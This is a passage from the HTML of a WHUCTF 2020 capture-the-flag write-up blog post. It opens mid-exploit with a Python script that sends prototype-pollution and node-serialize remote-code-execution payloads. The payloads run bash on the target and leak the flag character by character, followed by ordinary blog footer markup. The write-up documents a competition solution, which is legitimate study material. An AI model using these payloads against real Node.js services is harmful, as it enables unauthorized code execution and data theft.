+payload2 = r'{&quot;score&quot;: {&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;__proto__&quot;:{&quot;asd&quot;:&quot;_$$ND_FUNC$$_(()=&gt;{a=Array();a.push(`bash`);a.push(`-c`);var out=Array();var sp=opn(`a=$(bash /tmp/naivekun);exit $a`,{app:a,wait:true});sp.catch((j)=&gt;{console.log(j);logs.aaaac=j.toString();console.log(`FUCK`);});obj.banner=`fuckyou`;return `asd`})()&quot;,&quot;wait&quot;:&quot;_$$ND_FUNC$$_(()=&gt;{})&quot;}}},&quot;length&quot;:1}}'
+payload3 = r'{&quot;score&quot;: {&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;__proto__&quot;:{&quot;asd&quot;:&quot;_$$ND_FUNC$$_(()=&gt;{obj.banner=logs.aaaac})()&quot;,&quot;wait&quot;:&quot;_$$ND_FUNC$$_(()=&gt;{})&quot;}}},&quot;length&quot;:1}}'
+
+url=&quot;http://218.197.154.9:10001/record&quot;
+headers = {
+    &quot;Content-Type&quot;: &quot;application/json&quot;
+}
+
+for i in range(1000):
+    p0 = payload0.replace(&quot;OFFSET&quot;,str(i))
+    # print(p0)
+    p1 = payload1.replace(&quot;BASE64_HERE&quot;, base64.b64encode(bytes(p0,'utf-8')).decode('utf-8'))
+    # print(p1)
+    r=requests.post(url,data=p1, headers=headers)
+    time.sleep(0.2)
+    r=requests.post(url, data=payload2, headers=headers)
+    time.sleep(0.2)
+    r=requests.post(url, data=payload3, headers=headers)
+    time.sleep(0.2)
+    # print(r.text)
+    code = re.findall(&quot;code (\d+)&quot;,r.text)
+    # print(code)
+    print(chr(int(code[0])),end=&quot;&quot;)
+    sys.stdout.flush()
+
+</code></pre>
+<p>resolve需要时间，中间最好sleep一下</p>
+<p>一位一位猜出来了，比盲注快XD</p>
+<h1 id="misc">Misc</h1>
+<p>懒得写了23333</p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://naivekun.com/2020/05/whuctf-2020-wp/" title="WHUCTF 2020 WriteUp" target="_blank" rel="external">https://naivekun.com/2020/05/whuctf-2020-wp/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/naivekun" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://naivekun.com/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/naivekun" target="_blank"><span class="text-dark">naivekun</span><small class="ml-1x">CTFer</small></a></h3>
+        <div>Web/Pentest/Android</div>
+      </div>
+    </figure>
+  </div>
+</div>
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://naivekun.com/2020/05/hack-on-firewall-seccn-ac80wt/" title="魔改某防火墙，移植Openwrt"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://naivekun.com/2020/07/htb-book-and-forward-slash/"
+                    title="Hackthebox Book and ForwardSlash"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Catalogue</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        
+        <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal"
+            data-target="#donateModal"><span>$</span></button>
+        
+        <div class="bar-right">
+        </div>
+    </div>
+</nav>
+
+
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content donate">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                    aria-hidden="true">&times;</span></button>
+            <div class="modal-body">
+                <div class="donate-box">
+                    <div class="donate-head">
+                        <p>Maybe you could buy me a cup of coffee.</p>
+                    </div>
+                    <div class="tab-content">
+                        <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/alipayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                        <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/wechatpayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                    </div>
+                    <div class="donate-footer">
+                        <ul class="nav nav-tabs nav-justified" role="tablist">
+                            <li role="presentation" class="active">
+                                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay"
+                                    aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+                            </li>
+                            <li role="presentation" class="">
+                                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab"
+                                    aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i>
+                                    wechat payment</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/naivekun" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://naivekun.com/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;&nbsp;2018  -
+    2021
+    <div class="publishby">
+        Theme by naivekun base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://naivekun.com/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://naivekun.com/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: 'https:\/\/naivekun.com',
+            CONTENT_URL: 'https:\/\/naivekun.com\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://naivekun.com/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
